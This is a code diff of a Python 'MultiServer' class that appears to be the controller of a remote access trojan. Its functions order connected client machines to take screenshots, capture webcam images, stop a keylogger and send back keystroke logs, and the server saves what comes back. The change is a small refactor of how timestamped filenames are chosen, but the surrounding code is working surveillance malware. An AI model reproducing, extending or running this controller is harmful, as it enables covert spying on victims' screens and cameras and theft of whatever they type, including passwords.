@@ -90,7 +90,7 @@ def shell_print(data) -> None:
             print(data)
     return
 
-def _time_file() -> str:
+def _time() -> str:
     """ Get a filename from the current time """
     # returns str
     return str(datetime.now()).replace(':','-')
@@ -260,9 +260,11 @@ class MultiServer(object):
         self.send(conn, json_dumps(['LOG_FILE']))
         return self.receive(conn).decode()
 
-    def screenshot(self, conn, save_as='{}.png'.format(_time_file())) -> (bool, str):
+    def screenshot(self, conn, save_as=None) -> (bool, str):
         """ Take screenshot on Client """
         # returns True/False, None/error
+        if not save_as:
+            save_as = '{}.png'.format(_time())
         self.send(conn, json_dumps(['SCREENSHOT']))
         data = self.receive(conn)
         if data == b'ERROR':
@@ -272,9 +274,11 @@ class MultiServer(object):
             f.write(data)
         return True, save_as
 
-    def webcam(self, conn, save_as='webcam-{}.png'.format(_time_file())) -> bool:
+    def webcam(self, conn, save_as=None) -> bool:
         """ Take a webcam shot """
         # returns True/False, save_as/None
+        if not save_as:
+            save_as = 'webcam-{}.png'.format(_time())
         self.send(conn, json_dumps(['WEBCAM']))
         data = self.receive(conn)
         if data == b'ERROR':
@@ -384,9 +388,11 @@ class MultiServer(object):
         self.send(conn, json_dumps(['STOP_KEYLOGGER']))
         return json_loads(self.receive(conn))
 
-    def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))) -> str:
+    def get_log(self, conn, save_as=None) -> str:
         """ Transfer log to Server """
         # save_as: file name
+        if not save_as:
+            save_as = '{}.log'.format(_time())
         log = self._get_log(conn)
         self.receive_file(conn, log, save_as)
         return save_as
